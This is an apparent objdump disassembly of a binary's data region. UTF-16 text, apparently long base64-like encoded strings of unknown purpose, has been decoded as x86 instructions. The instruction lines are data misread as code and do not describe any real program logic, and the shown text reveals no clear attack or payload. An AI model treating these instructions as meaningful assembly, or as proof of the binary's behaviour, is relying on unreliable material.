1000368d:	6c                   	insb   (%dx),%es:(%edi)
1000368e:	00 70 00             	add    %dh,0x0(%eax)
10003691:	48                   	dec    %eax
10003692:	00 62 00             	add    %ah,0x0(%edx)
10003695:	32 00                	xor    (%eax),%al
10003697:	4a                   	dec    %edx
10003698:	00 71 00             	add    %dh,0x0(%ecx)
1000369b:	54                   	push   %esp
1000369c:	00 32                	add    %dh,(%edx)
1000369e:	00 70 00             	add    %dh,0x0(%eax)
100036a1:	47                   	inc    %edi
100036a2:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100036a6:	00 70 00             	add    %dh,0x0(%eax)
100036a9:	33 00                	xor    (%eax),%eax
100036ab:	52                   	push   %edx
100036ac:	00 32                	add    %dh,(%edx)
100036ae:	00 39                	add    %bh,(%ecx)
100036b0:	00 69 00             	add    %ch,0x0(%ecx)
100036b3:	61                   	popa
100036b4:	00 6b 00             	add    %ch,0x0(%ebx)
100036b7:	39 00                	cmp    %eax,(%eax)
100036b9:	71 00                	jno    0x100036bb
100036bb:	52                   	push   %edx
100036bc:	00 6b 00             	add    %ch,0x0(%ebx)
100036bf:	39 00                	cmp    %eax,(%eax)
100036c1:	71 00                	jno    0x100036c3
100036c3:	64 00 31             	add    %dh,%fs:(%ecx)
100036c6:	00 68 00             	add    %ch,0x0(%eax)
100036c9:	52                   	push   %edx
100036ca:	00 5a 00             	add    %bl,0x0(%edx)
100036cd:	30 00                	xor    %al,(%eax)
100036cf:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
100036d3:	59                   	pop    %ecx
100036d4:	00 6d 00             	add    %ch,0x0(%ebp)
100036d7:	70 00                	jo     0x100036d9
100036d9:	50                   	push   %eax
100036da:	00 61 00             	add    %ah,0x0(%ecx)
100036dd:	6b 00 5a             	imul   $0x5a,(%eax),%eax
100036e0:	00 50 00             	add    %dl,0x0(%eax)
100036e3:	61                   	popa
100036e4:	00 6e 00             	add    %ch,0x0(%esi)
100036e7:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
100036eb:	62 00                	bound  %eax,(%eax)
100036ed:	32 00                	xor    (%eax),%al
100036ef:	4a                   	dec    %edx
100036f0:	00 71 00             	add    %dh,0x0(%ecx)
100036f3:	54                   	push   %esp
100036f4:	00 32                	add    %dh,(%edx)
100036f6:	00 70 00             	add    %dh,0x0(%eax)
100036f9:	47                   	inc    %edi
100036fa:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100036fe:	00 70 00             	add    %dh,0x0(%eax)
10003701:	33 00                	xor    (%eax),%eax
10003703:	59                   	pop    %ecx
10003704:	00 30                	add    %dh,(%eax)
10003706:	00 68 00             	add    %ch,0x0(%eax)
10003709:	4b                   	dec    %ebx
1000370a:	00 52 00             	add    %dl,0x0(%edx)
1000370d:	32 00                	xor    (%eax),%al
1000370f:	39 00                	cmp    %eax,(%eax)
10003711:	69 00 61 00 6b 00    	imul   $0x6b0061,(%eax),%eax
10003717:	39 00                	cmp    %eax,(%eax)
10003719:	71 00                	jno    0x1000371b
1000371b:	52                   	push   %edx
1000371c:	00 6b 00             	add    %ch,0x0(%ebx)
1000371f:	39 00                	cmp    %eax,(%eax)
10003721:	71 00                	jno    0x10003723
10003723:	64 00 30             	add    %dh,%fs:(%eax)
10003726:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
1000372a:	00 59 00             	add    %bl,0x0(%ecx)
1000372d:	6d                   	insl   (%dx),%es:(%edi)
1000372e:	00 70 00             	add    %dh,0x0(%eax)
10003731:	50                   	push   %eax
10003732:	00 61 00             	add    %ah,0x0(%ecx)
10003735:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003738:	00 50 00             	add    %dl,0x0(%eax)
1000373b:	61                   	popa
1000373c:	00 6e 00             	add    %ch,0x0(%esi)
1000373f:	64 00 32             	add    %dh,%fs:(%edx)
10003742:	00 57 00             	add    %dl,0x0(%edi)
10003745:	54                   	push   %esp
10003746:	00 4a 00             	add    %cl,0x0(%edx)
10003749:	48                   	dec    %eax
1000374a:	00 62 00             	add    %ah,0x0(%edx)
1000374d:	32 00                	xor    (%eax),%al
1000374f:	4a                   	dec    %edx
10003750:	00 71 00             	add    %dh,0x0(%ecx)
10003753:	54                   	push   %esp
10003754:	00 32                	add    %dh,(%edx)
10003756:	00 70 00             	add    %dh,0x0(%eax)
10003759:	47                   	inc    %edi
1000375a:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
1000375e:	00 70 00             	add    %dh,0x0(%eax)
10003761:	33 00                	xor    (%eax),%eax
10003763:	52                   	push   %edx
10003764:	00 32                	add    %dh,(%edx)
10003766:	00 39                	add    %bh,(%ecx)
10003768:	00 69 00             	add    %ch,0x0(%ecx)
1000376b:	61                   	popa
1000376c:	00 6b 00             	add    %ch,0x0(%ebx)
1000376f:	39 00                	cmp    %eax,(%eax)
10003771:	71 00                	jno    0x10003773
10003773:	52                   	push   %edx
10003774:	00 6b 00             	add    %ch,0x0(%ebx)
10003777:	39 00                	cmp    %eax,(%eax)
10003779:	71 00                	jno    0x1000377b
1000377b:	64 00 31             	add    %dh,%fs:(%ecx)
1000377e:	00 5a 00             	add    %bl,0x0(%edx)
10003781:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
10003785:	30 00                	xor    %al,(%eax)
10003787:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
1000378b:	59                   	pop    %ecx
1000378c:	00 6d 00             	add    %ch,0x0(%ebp)
1000378f:	70 00                	jo     0x10003791
10003791:	50                   	push   %eax
10003792:	00 61 00             	add    %ah,0x0(%ecx)
10003795:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003798:	00 50 00             	add    %dl,0x0(%eax)
1000379b:	61                   	popa
1000379c:	00 6e 00             	add    %ch,0x0(%esi)
1000379f:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
100037a3:	62 00                	bound  %eax,(%eax)
100037a5:	32 00                	xor    (%eax),%al
100037a7:	4a                   	dec    %edx
100037a8:	00 71 00             	add    %dh,0x0(%ecx)
100037ab:	54                   	push   %esp
100037ac:	00 32                	add    %dh,(%edx)
100037ae:	00 70 00             	add    %dh,0x0(%eax)
100037b1:	47                   	inc    %edi
100037b2:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100037b6:	00 70 00             	add    %dh,0x0(%eax)
100037b9:	33 00                	xor    (%eax),%eax
100037bb:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
100037bf:	30 00                	xor    %al,(%eax)
100037c1:	39 00                	cmp    %eax,(%eax)
100037c3:	52                   	push   %edx
100037c4:	00 32                	add    %dh,(%edx)
100037c6:	00 39                	add    %bh,(%ecx)
100037c8:	00 69 00             	add    %ch,0x0(%ecx)
100037cb:	61                   	popa
100037cc:	00 6b 00             	add    %ch,0x0(%ebx)
100037cf:	39 00                	cmp    %eax,(%eax)
100037d1:	71 00                	jno    0x100037d3
100037d3:	52                   	push   %edx
100037d4:	00 6b 00             	add    %ch,0x0(%ebx)
100037d7:	39 00                	cmp    %eax,(%eax)
100037d9:	71 00                	jno    0x100037db
100037db:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
100037df:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100037e4:	15 47 00 6f 00       	adc    $0x6f0047,%eax
100037e9:	62 00                	bound  %eax,(%eax)
100037eb:	6a 00                	push   $0x0
100037ed:	4f                   	dec    %edi
100037ee:	00 6a 00             	add    %ch,0x0(%edx)
100037f1:	46                   	inc    %esi
100037f2:	00 4f 00             	add    %cl,0x0(%edi)
100037f5:	6a 00                	push   $0x0
100037f7:	77 00                	ja     0x100037f9
100037f9:	00 01                	add    %al,(%ecx)
100037fb:	00 86 39 52 00 57    	add    %al,0x57005239(%esi)
10003801:	00 52 00             	add    %dl,0x0(%edx)
10003804:	4f                   	dec    %edi
10003805:	00 53 00             	add    %dl,0x0(%ebx)
10003808:	33 00                	xor    (%eax),%eax
1000380a:	6f                   	outsl  %ds:(%esi),(%dx)
1000380b:	00 32                	add    %dh,(%edx)
1000380d:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003811:	00 4e 00             	add    %cl,0x0(%esi)
10003814:	72 00                	jb     0x10003816
10003816:	4e                   	dec    %esi
10003817:	00 31                	add    %dh,(%ecx)
10003819:	00 4a 00             	add    %cl,0x0(%edx)
1000381c:	74 00                	je     0x1000381e
1000381e:	52                   	push   %edx
1000381f:	00 6b 00             	add    %ch,0x0(%ebx)
10003822:	56                   	push   %esi
10003823:	00 6b 00             	add    %ch,0x0(%ebx)
10003826:	54                   	push   %esp
10003827:	00 6b 00             	add    %ch,0x0(%ebx)
1000382a:	74 00                	je     0x1000382c
1000382c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003830:	6b 00 39             	imul   $0x39,(%eax),%eax
10003833:	00 6a 00             	add    %ch,0x0(%edx)
10003836:	61                   	popa
10003837:	00 7a 00             	add    %bh,0x0(%edx)
1000383a:	64 00 46 00          	add    %al,%fs:0x0(%esi)
1000383e:	5a                   	pop    %edx
1000383f:	00 45 00             	add    %al,0x0(%ebp)
10003842:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003847:	00 6a 00             	add    %ch,0x0(%edx)
1000384a:	5a                   	pop    %edx
1000384b:	00 50 00             	add    %dl,0x0(%eax)
1000384e:	59                   	pop    %ecx
1000384f:	00 32                	add    %dh,(%edx)
10003851:	00 73 00             	add    %dh,0x0(%ebx)
10003854:	33 00                	xor    (%eax),%eax
10003856:	63 00                	arpl   %eax,(%eax)
10003858:	47                   	inc    %edi
10003859:	00 4a 00             	add    %cl,0x0(%edx)
1000385c:	48                   	dec    %eax
1000385d:	00 52 00             	add    %dl,0x0(%edx)
10003860:	57                   	push   %edi
10003861:	00 52 00             	add    %dl,0x0(%edx)
10003864:	4f                   	dec    %edi
10003865:	00 53 00             	add    %dl,0x0(%ebx)
10003868:	33 00                	xor    (%eax),%eax
1000386a:	6f                   	outsl  %ds:(%esi),(%dx)
1000386b:	00 32                	add    %dh,(%edx)
1000386d:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003871:	00 4e 00             	add    %cl,0x0(%esi)
10003874:	72 00                	jb     0x10003876
10003876:	4e                   	dec    %esi
10003877:	00 30                	add    %dh,(%eax)
10003879:	00 56 00             	add    %dl,0x0(%esi)
1000387c:	6b 00 54             	imul   $0x54,(%eax),%eax
1000387f:	00 6b 00             	add    %ch,0x0(%ebx)
10003882:	74 00                	je     0x10003884
10003884:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003888:	6b 00 39             	imul   $0x39,(%eax),%eax
1000388b:	00 6a 00             	add    %ch,0x0(%edx)
1000388e:	61                   	popa
1000388f:	00 7a 00             	add    %bh,0x0(%edx)
10003892:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003896:	61                   	popa
10003897:	00 30                	add    %dh,(%eax)
10003899:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
1000389d:	00 5a 00             	add    %bl,0x0(%edx)
100038a0:	45                   	inc    %ebp
100038a1:	00 35 00 4c 00 65    	add    %dh,0x65004c00
100038a7:	00 6a 00             	add    %ch,0x0(%edx)
100038aa:	5a                   	pop    %edx
100038ab:	00 50 00             	add    %dl,0x0(%eax)
100038ae:	59                   	pop    %ecx
100038af:	00 32                	add    %dh,(%edx)
100038b1:	00 73 00             	add    %dh,0x0(%ebx)
100038b4:	33 00                	xor    (%eax),%eax
100038b6:	52                   	push   %edx
100038b7:	00 57 00             	add    %dl,0x0(%edi)
100038ba:	52                   	push   %edx
100038bb:	00 4f 00             	add    %cl,0x0(%edi)
100038be:	53                   	push   %ebx
100038bf:	00 33                	add    %dh,(%ebx)
100038c1:	00 6f 00             	add    %ch,0x0(%edi)
100038c4:	32 00                	xor    (%eax),%al
100038c6:	54                   	push   %esp
100038c7:	00 32                	add    %dh,(%edx)
100038c9:	00 4e 00             	add    %cl,0x0(%esi)
100038cc:	72 00                	jb     0x100038ce
100038ce:	4e                   	dec    %esi
100038cf:	00 30                	add    %dh,(%eax)
100038d1:	00 68 00             	add    %ch,0x0(%eax)
100038d4:	53                   	push   %ebx
100038d5:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
100038d9:	00 56 00             	add    %dl,0x0(%esi)
100038dc:	6b 00 54             	imul   $0x54,(%eax),%eax
100038df:	00 6b 00             	add    %ch,0x0(%ebx)
100038e2:	74 00                	je     0x100038e4
100038e4:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
100038e8:	6b 00 39             	imul   $0x39,(%eax),%eax
100038eb:	00 6a 00             	add    %ch,0x0(%edx)
100038ee:	61                   	popa
100038ef:	00 7a 00             	add    %bh,0x0(%edx)
100038f2:	64 00 46 00          	add    %al,%fs:0x0(%esi)
100038f6:	5a                   	pop    %edx
100038f7:	00 45 00             	add    %al,0x0(%ebp)
100038fa:	35 00 4c 00 65       	xor    $0x65004c00,%eax
100038ff:	00 6a 00             	add    %ch,0x0(%edx)
10003902:	5a                   	pop    %edx
10003903:	00 50 00             	add    %dl,0x0(%eax)
10003906:	59                   	pop    %ecx
10003907:	00 32                	add    %dh,(%edx)
10003909:	00 73 00             	add    %dh,0x0(%ebx)
1000390c:	33 00                	xor    (%eax),%eax
1000390e:	53                   	push   %ebx
1000390f:	00 55 00             	add    %dl,0x0(%ebp)
10003912:	68 00 6b 00 52       	push   $0x52006b00
10003917:	00 57 00             	add    %dl,0x0(%edi)
1000391a:	52                   	push   %edx
1000391b:	00 4f 00             	add    %cl,0x0(%edi)
1000391e:	53                   	push   %ebx
1000391f:	00 33                	add    %dh,(%ebx)
10003921:	00 6f 00             	add    %ch,0x0(%edi)
10003924:	32 00                	xor    (%eax),%al
10003926:	54                   	push   %esp
10003927:	00 32                	add    %dh,(%edx)
10003929:	00 4e 00             	add    %cl,0x0(%esi)
1000392c:	72 00                	jb     0x1000392e
1000392e:	4e                   	dec    %esi
1000392f:	00 30                	add    %dh,(%eax)
10003931:	00 56 00             	add    %dl,0x0(%esi)
10003934:	6b 00 54             	imul   $0x54,(%eax),%eax
10003937:	00 6b 00             	add    %ch,0x0(%ebx)
1000393a:	74 00                	je     0x1000393c
1000393c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003940:	6b 00 39             	imul   $0x39,(%eax),%eax
10003943:	00 6a 00             	add    %ch,0x0(%edx)
10003946:	61                   	popa
10003947:	00 7a 00             	add    %bh,0x0(%edx)
1000394a:	64 00 35 00 59 00 56 	add    %dh,%fs:0x56005900
10003951:	00 68 00             	add    %ch,0x0(%eax)
10003954:	46                   	inc    %esi
10003955:	00 5a 00             	add    %bl,0x0(%edx)
10003958:	45                   	inc    %ebp
10003959:	00 35 00 4c 00 65    	add    %dh,0x65004c00
1000395f:	00 6a 00             	add    %ch,0x0(%edx)
10003962:	5a                   	pop    %edx
10003963:	00 50 00             	add    %dl,0x0(%eax)
10003966:	59                   	pop    %ecx
10003967:	00 32                	add    %dh,(%edx)
10003969:	00 73 00             	add    %dh,0x0(%ebx)
1000396c:	33 00                	xor    (%eax),%eax
1000396e:	52                   	push   %edx
1000396f:	00 57 00             	add    %dl,0x0(%edi)
10003972:	52                   	push   %edx
10003973:	00 4f 00             	add    %cl,0x0(%edi)
10003976:	53                   	push   %ebx
10003977:	00 33                	add    %dh,(%ebx)
10003979:	00 6f 00             	add    %ch,0x0(%edi)
1000397c:	32 00                	xor    (%eax),%al
1000397e:	54                   	push   %esp
1000397f:	00 32                	add    %dh,(%edx)
10003981:	00 4e 00             	add    %cl,0x0(%esi)
10003984:	72 00                	jb     0x10003986
10003986:	4e                   	dec    %esi
10003987:	00 31                	add    %dh,(%ecx)
10003989:	00 4a 00             	add    %cl,0x0(%edx)
1000398c:	73 00                	jae    0x1000398e
1000398e:	53                   	push   %ebx
1000398f:	00 55 00             	add    %dl,0x0(%ebp)
10003992:	56                   	push   %esi
10003993:	00 6b 00             	add    %ch,0x0(%ebx)
10003996:	54                   	push   %esp
10003997:	00 6b 00             	add    %ch,0x0(%ebx)
1000399a:	74 00                	je     0x1000399c
1000399c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
100039a0:	6b 00 39             	imul   $0x39,(%eax),%eax
100039a3:	00 6a 00             	add    %ch,0x0(%edx)
100039a6:	61                   	popa
100039a7:	00 7a 00             	add    %bh,0x0(%edx)
100039aa:	64 00 46 00          	add    %al,%fs:0x0(%esi)
100039ae:	5a                   	pop    %edx
100039af:	00 45 00             	add    %al,0x0(%ebp)
100039b2:	35 00 4c 00 65       	xor    $0x65004c00,%eax
100039b7:	00 6a 00             	add    %ch,0x0(%edx)
100039ba:	5a                   	pop    %edx
100039bb:	00 50 00             	add    %dl,0x0(%eax)
100039be:	59                   	pop    %ecx
100039bf:	00 32                	add    %dh,(%edx)
100039c1:	00 73 00             	add    %dh,0x0(%ebx)
100039c4:	33 00                	xor    (%eax),%eax
100039c6:	52                   	push   %edx
100039c7:	00 6e 00             	add    %ch,0x0(%esi)
100039ca:	42                   	inc    %edx
100039cb:	00 47 00             	add    %al,0x0(%edi)
100039ce:	52                   	push   %edx
100039cf:	00 57 00             	add    %dl,0x0(%edi)
100039d2:	52                   	push   %edx
100039d3:	00 4f 00             	add    %cl,0x0(%edi)
100039d6:	53                   	push   %ebx
100039d7:	00 33                	add    %dh,(%ebx)
100039d9:	00 6f 00             	add    %ch,0x0(%edi)
100039dc:	32 00                	xor    (%eax),%al
100039de:	54                   	push   %esp
100039df:	00 32                	add    %dh,(%edx)
100039e1:	00 4e 00             	add    %cl,0x0(%esi)
100039e4:	72 00                	jb     0x100039e6
100039e6:	4e                   	dec    %esi
100039e7:	00 30                	add    %dh,(%eax)
100039e9:	00 56 00             	add    %dl,0x0(%esi)
100039ec:	6b 00 54             	imul   $0x54,(%eax),%eax
100039ef:	00 6b 00             	add    %ch,0x0(%ebx)
100039f2:	74 00                	je     0x100039f4
100039f4:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
100039f8:	6b 00 39             	imul   $0x39,(%eax),%eax
100039fb:	00 6a 00             	add    %ch,0x0(%edx)
100039fe:	61                   	popa
100039ff:	00 7a 00             	add    %bh,0x0(%edx)
10003a02:	64 00 6c 00 52       	add    %ch,%fs:0x52(%eax,%eax,1)
10003a07:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
10003a0b:	00 46 00             	add    %al,0x0(%esi)
10003a0e:	5a                   	pop    %edx
10003a0f:	00 45 00             	add    %al,0x0(%ebp)
10003a12:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003a17:	00 6a 00             	add    %ch,0x0(%edx)
10003a1a:	5a                   	pop    %edx
10003a1b:	00 50 00             	add    %dl,0x0(%eax)
10003a1e:	59                   	pop    %ecx
10003a1f:	00 32                	add    %dh,(%edx)
10003a21:	00 73 00             	add    %dh,0x0(%ebx)
10003a24:	33 00                	xor    (%eax),%eax
10003a26:	52                   	push   %edx
10003a27:	00 57 00             	add    %dl,0x0(%edi)
10003a2a:	52                   	push   %edx
10003a2b:	00 4f 00             	add    %cl,0x0(%edi)
10003a2e:	53                   	push   %ebx
10003a2f:	00 33                	add    %dh,(%ebx)
10003a31:	00 6f 00             	add    %ch,0x0(%edi)
10003a34:	32 00                	xor    (%eax),%al
10003a36:	54                   	push   %esp
10003a37:	00 32                	add    %dh,(%edx)
10003a39:	00 4e 00             	add    %cl,0x0(%esi)
10003a3c:	72 00                	jb     0x10003a3e
10003a3e:	4e                   	dec    %esi
10003a3f:	00 30                	add    %dh,(%eax)
10003a41:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
10003a45:	00 4d 00             	add    %cl,0x0(%ebp)
10003a48:	45                   	inc    %ebp
10003a49:	00 56 00             	add    %dl,0x0(%esi)
10003a4c:	6b 00 54             	imul   $0x54,(%eax),%eax
10003a4f:	00 6b 00             	add    %ch,0x0(%ebx)
10003a52:	74 00                	je     0x10003a54
10003a54:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003a58:	6b 00 39             	imul   $0x39,(%eax),%eax
10003a5b:	00 6a 00             	add    %ch,0x0(%edx)
10003a5e:	61                   	popa
10003a5f:	00 7a 00             	add    %bh,0x0(%edx)
10003a62:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10003a66:	5a                   	pop    %edx
10003a67:	00 45 00             	add    %al,0x0(%ebp)
10003a6a:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003a6f:	00 6a 00             	add    %ch,0x0(%edx)
10003a72:	5a                   	pop    %edx
10003a73:	00 50 00             	add    %dl,0x0(%eax)
10003a76:	59                   	pop    %ecx
10003a77:	00 32                	add    %dh,(%edx)
10003a79:	00 73 00             	add    %dh,0x0(%ebx)
10003a7c:	33 00                	xor    (%eax),%eax
10003a7e:	5a                   	pop    %edx
10003a7f:	00 46 00             	add    %al,0x0(%esi)
10003a82:	70 00                	jo     0x10003a84
10003a84:	61                   	popa
10003a85:	00 52 00             	add    %dl,0x0(%edx)
10003a88:	57                   	push   %edi
10003a89:	00 52 00             	add    %dl,0x0(%edx)
10003a8c:	4f                   	dec    %edi
10003a8d:	00 53 00             	add    %dl,0x0(%ebx)
10003a90:	33 00                	xor    (%eax),%eax
10003a92:	6f                   	outsl  %ds:(%esi),(%dx)
10003a93:	00 32                	add    %dh,(%edx)
10003a95:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003a99:	00 4e 00             	add    %cl,0x0(%esi)
10003a9c:	72 00                	jb     0x10003a9e
10003a9e:	4e                   	dec    %esi
10003a9f:	00 30                	add    %dh,(%eax)
10003aa1:	00 56 00             	add    %dl,0x0(%esi)
10003aa4:	6b 00 54             	imul   $0x54,(%eax),%eax
10003aa7:	00 6b 00             	add    %ch,0x0(%ebx)
10003aaa:	74 00                	je     0x10003aac
10003aac:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003ab0:	6b 00 39             	imul   $0x39,(%eax),%eax
10003ab3:	00 6a 00             	add    %ch,0x0(%edx)
10003ab6:	61                   	popa
10003ab7:	00 7a 00             	add    %bh,0x0(%edx)
10003aba:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
10003abe:	4f                   	dec    %edi
10003abf:	00 58 00             	add    %bl,0x0(%eax)
10003ac2:	6c                   	insb   (%dx),%es:(%edi)
10003ac3:	00 46 00             	add    %al,0x0(%esi)
10003ac6:	5a                   	pop    %edx
10003ac7:	00 45 00             	add    %al,0x0(%ebp)
10003aca:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003acf:	00 6a 00             	add    %ch,0x0(%edx)
10003ad2:	5a                   	pop    %edx
10003ad3:	00 50 00             	add    %dl,0x0(%eax)
10003ad6:	59                   	pop    %ecx
10003ad7:	00 32                	add    %dh,(%edx)
10003ad9:	00 73 00             	add    %dh,0x0(%ebx)
10003adc:	33 00                	xor    (%eax),%eax
10003ade:	52                   	push   %edx
10003adf:	00 57 00             	add    %dl,0x0(%edi)
10003ae2:	52                   	push   %edx
10003ae3:	00 4f 00             	add    %cl,0x0(%edi)
10003ae6:	53                   	push   %ebx
10003ae7:	00 33                	add    %dh,(%ebx)
10003ae9:	00 6f 00             	add    %ch,0x0(%edi)
10003aec:	32 00                	xor    (%eax),%al
10003aee:	54                   	push   %esp
10003aef:	00 32                	add    %dh,(%edx)
10003af1:	00 4e 00             	add    %cl,0x0(%esi)
10003af4:	72 00                	jb     0x10003af6
10003af6:	4e                   	dec    %esi
10003af7:	00 32                	add    %dh,(%edx)
10003af9:	00 52 00             	add    %dl,0x0(%edx)
10003afc:	55                   	push   %ebp
10003afd:	00 62 00             	add    %ah,0x0(%edx)
10003b00:	45                   	inc    %ebp
10003b01:	00 56 00             	add    %dl,0x0(%esi)
10003b04:	6b 00 54             	imul   $0x54,(%eax),%eax
10003b07:	00 6b 00             	add    %ch,0x0(%ebx)
10003b0a:	74 00                	je     0x10003b0c
10003b0c:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003b10:	6b 00 39             	imul   $0x39,(%eax),%eax
10003b13:	00 6a 00             	add    %ch,0x0(%edx)
10003b16:	61                   	popa
10003b17:	00 7a 00             	add    %bh,0x0(%edx)
10003b1a:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10003b1e:	5a                   	pop    %edx
10003b1f:	00 45 00             	add    %al,0x0(%ebp)
10003b22:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003b27:	00 6a 00             	add    %ch,0x0(%edx)
10003b2a:	5a                   	pop    %edx
10003b2b:	00 50 00             	add    %dl,0x0(%eax)
10003b2e:	59                   	pop    %ecx
10003b2f:	00 32                	add    %dh,(%edx)
10003b31:	00 73 00             	add    %dh,0x0(%ebx)
10003b34:	33 00                	xor    (%eax),%eax
10003b36:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
10003b3a:	31 00                	xor    %eax,(%eax)
10003b3c:	45                   	inc    %ebp
10003b3d:	00 52 00             	add    %dl,0x0(%edx)
10003b40:	57                   	push   %edi
10003b41:	00 52 00             	add    %dl,0x0(%edx)
10003b44:	4f                   	dec    %edi
10003b45:	00 53 00             	add    %dl,0x0(%ebx)
10003b48:	33 00                	xor    (%eax),%eax
10003b4a:	6f                   	outsl  %ds:(%esi),(%dx)
10003b4b:	00 32                	add    %dh,(%edx)
10003b4d:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003b51:	00 4e 00             	add    %cl,0x0(%esi)
10003b54:	72 00                	jb     0x10003b56
10003b56:	4e                   	dec    %esi
10003b57:	00 30                	add    %dh,(%eax)
10003b59:	00 56 00             	add    %dl,0x0(%esi)
10003b5c:	6b 00 54             	imul   $0x54,(%eax),%eax
10003b5f:	00 6b 00             	add    %ch,0x0(%ebx)
10003b62:	74 00                	je     0x10003b64
10003b64:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003b68:	6b 00 39             	imul   $0x39,(%eax),%eax
10003b6b:	00 6a 00             	add    %ch,0x0(%edx)
10003b6e:	61                   	popa
10003b6f:	00 7a 00             	add    %bh,0x0(%edx)
10003b72:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
10003b76:	4e                   	dec    %esi
10003b77:	00 46 00             	add    %al,0x0(%esi)
10003b7a:	52                   	push   %edx
10003b7b:	00 46 00             	add    %al,0x0(%esi)
10003b7e:	5a                   	pop    %edx
10003b7f:	00 45 00             	add    %al,0x0(%ebp)
10003b82:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003b87:	00 6a 00             	add    %ch,0x0(%edx)
10003b8a:	5a                   	pop    %edx
10003b8b:	00 50 00             	add    %dl,0x0(%eax)
10003b8e:	59                   	pop    %ecx
10003b8f:	00 32                	add    %dh,(%edx)
10003b91:	00 73 00             	add    %dh,0x0(%ebx)
10003b94:	33 00                	xor    (%eax),%eax
10003b96:	52                   	push   %edx
10003b97:	00 57 00             	add    %dl,0x0(%edi)
10003b9a:	52                   	push   %edx
10003b9b:	00 4f 00             	add    %cl,0x0(%edi)
10003b9e:	53                   	push   %ebx
10003b9f:	00 33                	add    %dh,(%ebx)
10003ba1:	00 6f 00             	add    %ch,0x0(%edi)
10003ba4:	32 00                	xor    (%eax),%al
10003ba6:	54                   	push   %esp
10003ba7:	00 32                	add    %dh,(%edx)
10003ba9:	00 4e 00             	add    %cl,0x0(%esi)
10003bac:	72 00                	jb     0x10003bae
10003bae:	4e                   	dec    %esi
10003baf:	00 33                	add    %dh,(%ebx)
10003bb1:	00 70 00             	add    %dh,0x0(%eax)
10003bb4:	61                   	popa
10003bb5:	00 61 00             	add    %ah,0x0(%ecx)
10003bb8:	6b 00 56             	imul   $0x56,(%eax),%eax
10003bbb:	00 6b 00             	add    %ch,0x0(%ebx)
10003bbe:	54                   	push   %esp
10003bbf:	00 6b 00             	add    %ch,0x0(%ebx)
10003bc2:	74 00                	je     0x10003bc4
10003bc4:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
10003bc8:	6b 00 39             	imul   $0x39,(%eax),%eax
10003bcb:	00 6a 00             	add    %ch,0x0(%edx)
10003bce:	61                   	popa
10003bcf:	00 7a 00             	add    %bh,0x0(%edx)
10003bd2:	64 00 46 00          	add    %al,%fs:0x0(%esi)
10003bd6:	5a                   	pop    %edx
10003bd7:	00 45 00             	add    %al,0x0(%ebp)
10003bda:	35 00 4c 00 65       	xor    $0x65004c00,%eax
10003bdf:	00 6a 00             	add    %ch,0x0(%edx)
10003be2:	5a                   	pop    %edx
10003be3:	00 50 00             	add    %dl,0x0(%eax)
10003be6:	59                   	pop    %ecx
10003be7:	00 32                	add    %dh,(%edx)
10003be9:	00 73 00             	add    %dh,0x0(%ebx)
10003bec:	33 00                	xor    (%eax),%eax
10003bee:	59                   	pop    %ecx
10003bef:	00 31                	add    %dh,(%ecx)
10003bf1:	00 52 00             	add    %dl,0x0(%edx)
10003bf4:	57                   	push   %edi
10003bf5:	00 52 00             	add    %dl,0x0(%edx)
10003bf8:	57                   	push   %edi
10003bf9:	00 52 00             	add    %dl,0x0(%edx)
10003bfc:	4f                   	dec    %edi
10003bfd:	00 53 00             	add    %dl,0x0(%ebx)
10003c00:	33 00                	xor    (%eax),%eax
10003c02:	6f                   	outsl  %ds:(%esi),(%dx)
10003c03:	00 32                	add    %dh,(%edx)
10003c05:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003c09:	00 4e 00             	add    %cl,0x0(%esi)
10003c0c:	72 00                	jb     0x10003c0e
10003c0e:	4e                   	dec    %esi
10003c0f:	00 30                	add    %dh,(%eax)
10003c11:	00 56 00             	add    %dl,0x0(%esi)
10003c14:	6b 00 54             	imul   $0x54,(%eax),%eax
10003c17:	00 6b 00             	add    %ch,0x0(%ebx)
10003c1a:	74 00                	je     0x10003c1c
